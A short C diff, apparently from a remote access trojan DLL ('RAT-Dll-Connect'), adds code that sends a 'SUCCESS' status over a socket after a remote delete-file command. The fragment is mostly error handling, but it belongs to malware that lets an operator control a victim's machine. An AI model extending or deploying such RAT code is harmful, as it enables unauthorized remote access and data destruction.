@@ -331,6 +331,18 @@ INT startListen()
                     OutputDebugStringA(msgBuf);
                     goto cleanup;
                 }
+
+                // Send back success status code
+                status = send(clientSock, "SUCCESS", 7, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    status = WSAGetLastError();
+                    goto cleanup;
+                }
+
+                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed delete file!\n");
             }
         }
 
